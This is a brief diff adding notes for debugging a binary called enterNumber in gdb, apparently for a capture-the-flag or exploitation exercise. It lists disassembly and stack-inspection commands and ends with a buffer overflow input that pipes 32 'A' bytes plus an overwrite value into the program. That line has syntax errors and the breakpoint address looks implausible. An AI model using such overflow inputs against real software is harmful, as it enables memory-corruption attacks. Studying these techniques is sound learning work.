@@ -1,0 +1,16 @@
+
+command
+gdb ./enterNumber
+set disassembly-flavor intel     
+disassemble main
+disassemble enterNumber
+display/i $eip
+b *0x457383784378
+i b
+x/128bx $esp
+run
+ni
+i r
+
+
+python - c "print('A'*32 + \x01\x00\x00\x00')" | ./enterNumber
